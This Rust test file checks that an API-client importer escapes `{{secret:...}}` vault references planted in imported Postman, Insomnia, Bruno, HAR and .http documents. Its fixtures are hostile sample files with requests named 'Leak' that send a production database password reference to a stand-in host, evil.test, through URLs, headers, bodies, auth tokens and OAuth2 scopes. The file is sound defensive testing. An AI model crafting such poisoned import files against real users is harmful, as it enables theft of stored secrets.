//! Issue #95: a `{{secret:...}}` reference planted in an imported document
//! never becomes a live reference in a saved request or environment. Each
//! importer writes it escaped (`\{{secret:...}}`) and the report lists it,
//! while plain `{{variables}}` stay.

mod common;

use std::fs;
use std::path::Path;

use common::{Setup, tree};
use rustman_core::model::KindRegistry;
use rustman_import::ir::NoteKind;
use rustman_import::{Plan, SourceOptions, load};

const REF: &str = "{{secret:vault/kv/prod/db#password}}";

/// Plan the source at `path` (a file or folder) into an empty root.
fn plan_path(path: &Path) -> Plan {
    let dir = tempfile::tempdir().unwrap();
    let shown = path.file_name().unwrap().to_str().unwrap();
    let (format, collection) = load(None, path, shown, &SourceOptions::default()).unwrap();
    Setup::new(dir.path()).plan_collection(format, collection, shown)
}

/// Write `files` under a new temporary folder; returns it and the path of
/// the first file (or the folder, for `folder: true`).
fn source(files: &[(&str, &str)], folder: bool) -> (tempfile::TempDir, std::path::PathBuf) {
    let dir = tempfile::tempdir().unwrap();
    let root = dir.path().join("src");
    for (name, text) in files {
        let path = root.join(name);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, text).unwrap();
    }
    let path = if folder { root } else { root.join(files[0].0) };
    (dir, path)
}

/// Every `{{secret:` of `text` is escaped by a preceding backslash.
fn all_escaped(text: &str) -> bool {
    text.match_indices("{{secret:")
        .all(|(at, _)| text[..at].ends_with('\\'))
}

/// The planned files hold the reference only escaped, request files still
/// load, plain `{{variable}}` is kept, nothing live is moved into the
/// secret store, and the report lists what was neutralized.
fn assert_neutralized(plan: &Plan, variable: &str) {
    let all = tree(plan);
    let registry = KindRegistry::default();
    for f in &plan.files {
        assert!(all_escaped(&f.text), "{}:\n{}", f.path, f.text);
        if f.path.ends_with(".rman.yaml") {
            let loaded = registry.load(Path::new(&f.path), &f.text);
            assert!(loaded.is_ok(), "{}: {loaded:?}\n{}", f.path, f.text);
        }
    }
    let kept_in_store = plan
        .secrets
        .iter()
        .any(|m| m.secret.expose().contains("{{secret:"));
    assert!(
        all.contains("\\{{secret:vault/kv/prod/db#password}}") || kept_in_store,
        "{all}"
    );
    for m in &plan.secrets {
        assert!(all_escaped(m.secret.expose()), "{}", m.secret.name());
    }
    assert!(all.contains(variable), "{variable} kept:\n{all}");
    let review: Vec<_> = plan
        .report
        .notes
        .iter()
        .filter(|n| n.kind == NoteKind::Review && n.message.contains(REF))
        .collect();
    assert!(!review.is_empty(), "{:?}", plan.report.notes);
    assert!(review[0].message.contains("neutralized"));
    assert!(plan.report.to_json().contains("neutralized"));
    assert!(plan.report.summary_text().contains("neutralized"));
}

#[test]
fn postman_collection_references_are_neutralized() {
    let collection = format!(
        r#"{{
  "info": {{"name": "Evil", "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"}},
  "variable": [{{"key": "lookup", "value": "{REF}"}}],
  "item": [{{
    "name": "Leak",
    "request": {{
      "method": "POST",
      "url": "{{{{base_url}}}}/leak?q={REF}",
      "header": [{{"key": "X-Lookup", "value": "{REF}"}}],
      "body": {{"mode": "raw", "raw": "{{\"pw\": \"{REF}\"}}", "options": {{"raw": {{"language": "json"}}}}}},
      "auth": {{"type": "bearer", "bearer": [{{"key": "token", "value": "{REF}"}}]}}
    }}
  }}]
}}"#
    );
    let (_dir, path) = source(&[("evil.postman_collection.json", &collection)], false);
    assert_neutralized(&plan_path(&path), "{{base_url}}");
}

/// An OAuth2 scope is sent to the token (and authorize) URL, so a
/// reference planted there is neutralized like any other field.
#[test]
fn postman_oauth2_scope_references_are_neutralized() {
    let collection = format!(
        r#"{{
  "info": {{"name": "Evil", "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"}},
  "item": [{{
    "name": "Leak",
    "request": {{
      "method": "GET",
      "url": "{{{{base_url}}}}/leak",
      "auth": {{"type": "oauth2", "oauth2": [
        {{"key": "accessTokenUrl", "value": "https://evil.test/token"}},
        {{"key": "grant_type", "value": "client_credentials"}},
        {{"key": "clientId", "value": "x"}},
        {{"key": "scope", "value": "read {REF}"}}
      ]}}
    }}
  }}]
}}"#
    );
    let (_dir, path) = source(&[("evil.postman_collection.json", &collection)], false);
    let plan = plan_path(&path);
    assert_neutralized(&plan, "{{base_url}}");
    assert!(tree(&plan).contains("scopes"), "{}", tree(&plan));
}

/// GraphQL variables stay structured (valid JSON) once neutralized, and the
/// harmless ones are kept.
#[test]
fn postman_graphql_variable_references_are_neutralized() {
    let collection = format!(
        r#"{{
  "info": {{"name": "Evil", "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"}},
  "item": [{{
    "name": "Leak",
    "request": {{
      "method": "POST",
      "url": "{{{{base_url}}}}/graphql",
      "body": {{"mode": "graphql", "graphql": {{
        "query": "query($id: ID!, $pw: String) {{ user(id: $id) {{ name }} }}",
        "variables": "{{\"id\": \"42\", \"pw\": \"{REF}\"}}"
      }}}}
    }}
  }}]
}}"#
    );
    let (_dir, path) = source(&[("evil.postman_collection.json", &collection)], false);
    let plan = plan_path(&path);
    assert_neutralized(&plan, "{{base_url}}");
    let all = tree(&plan);
    assert!(!all.contains("# graphql-variables"), "{all}");
    assert!(
        all.contains("id: '42'") || all.contains("id: \"42\""),
        "{all}"
    );
    assert!(
        !plan
            .report
            .notes
            .iter()
            .any(|n| n.message.contains("not a flat JSON object")),
        "{:?}",
        plan.report.notes
    );
}

#[test]
fn postman_environment_references_are_neutralized() {
    let env = format!(
        r#"{{
  "name": "Evil",
  "values": [
    {{"key": "base_url", "value": "https://evil.test/{{{{host}}}}", "enabled": true}},
    {{"key": "lookup", "value": "{REF}", "enabled": true}},
    {{"key": "db_password", "value": "{REF}", "type": "secret", "enabled": true}}
  ],
  "_postman_variable_scope": "environment"
}}"#
    );
    let (_dir, path) = source(&[("evil.postman_environment.json", &env)], false);
    assert_neutralized(&plan_path(&path), "{{host}}");
}

#[test]
fn insomnia_references_are_neutralized_even_after_translation() {
    let export = format!(
        r#"{{
  "_type": "export",
  "__export_format": 4,
  "resources": [
    {{"_id": "wrk_1", "_type": "workspace", "name": "Evil"}},
    {{
      "_id": "req_1",
      "_type": "request",
      "parentId": "wrk_1",
      "name": "Leak",
      "method": "GET",
      "url": "{{{{ _.base_url }}}}/leak",
      "headers": [
        {{"name": "X-Lookup", "value": "{REF}"}},
        {{"name": "X-Translated", "value": "{{{{ _.secret:vault/kv/prod/db#password }}}}"}}
      ],
      "body": {{}},
      "authentication": {{}}
    }}
  ]
}}"#
    );
    let (_dir, path) = source(&[("evil.json", &export)], false);
    let plan = plan_path(&path);
    assert_neutralized(&plan, "{{base_url}}");
    assert!(!tree(&plan).contains("{{ _.secret"), "{}", tree(&plan));
}

#[test]
fn bruno_references_are_neutralized() {
    let request = format!(
        "meta {{\n  name: Leak\n  type: http\n  seq: 1\n}}\n\n\
         get {{\n  url: {{{{base_url}}}}/leak\n  body: none\n  auth: none\n}}\n\n\
         headers {{\n  X-Lookup: {REF}\n}}\n"
    );
    let env = format!("vars {{\n  base_url: https://evil.test\n  lookup: {REF}\n}}\n");
    let (_dir, path) = source(
        &[
            (
                "bruno.json",
                r#"{"version": "1", "name": "Evil", "type": "collection"}"#,
            ),
            ("leak.bru", &request),
            ("environments/prod.bru", &env),
        ],
        true,
    );
    assert_neutralized(&plan_path(&path), "{{base_url}}");
}

#[test]
fn har_references_are_neutralized() {
    let har = format!(
        r#"{{
  "log": {{
    "version": "1.2",
    "creator": {{"name": "test", "version": "1"}},
    "entries": [{{
      "startedDateTime": "2026-10-01T10:00:00.000Z",
      "time": 1,
      "request": {{
        "method": "POST",
        "url": "https://evil.test/leak",
        "httpVersion": "HTTP/1.1",
        "cookies": [],
        "headers": [{{"name": "X-Lookup", "value": "{REF}"}}],
        "queryString": [],
        "postData": {{"mimeType": "application/json", "text": "{{\"pw\": \"{REF}\", \"n\": \"{{{{base}}}}\"}}"}},
        "headersSize": -1,
        "bodySize": -1
      }},
      "response": {{
        "status": 200, "statusText": "OK", "httpVersion": "HTTP/1.1",
        "cookies": [], "headers": [], "content": {{"size": 0, "mimeType": "text/plain"}},
        "redirectURL": "", "headersSize": -1, "bodySize": -1
      }},
      "cache": {{}},
      "timings": {{"send": 0, "wait": 1, "receive": 0}}
    }}]
  }}
}}"#
    );
    let (_dir, path) = source(&[("evil.har", &har)], false);
    assert_neutralized(&plan_path(&path), "{{base}}");
}

#[test]
fn http_file_references_are_neutralized() {
    let http = format!(
        "@base = https://evil.test\n\n\
         POST {{{{base}}}}/leak\nX-Lookup: {REF}\nContent-Type: application/json\n\n\
         {{\"pw\": \"{REF}\"}}\n"
    );
    let (_dir, path) = source(&[("evil.http", &http)], false);
    assert_neutralized(&plan_path(&path), "{{base}}");
}

#[test]
fn escaped_references_and_plain_variables_are_left_alone() {
    let http = "POST {{base}}/x\nX-Literal: \\{{secret:vault/kv/a#b}}\n\n";
    let (_dir, path) = source(&[("plain.http", http)], false);
    let plan = plan_path(&path);
    let all = tree(&plan);
    assert!(all.contains("{{base}}/x"), "{all}");
    assert!(all_escaped(&all), "{all}");
    assert!(
        !plan
            .report
            .notes
            .iter()
            .any(|n| n.message.contains("neutralized")),
        "{:?}",
        plan.report.notes
    );
}
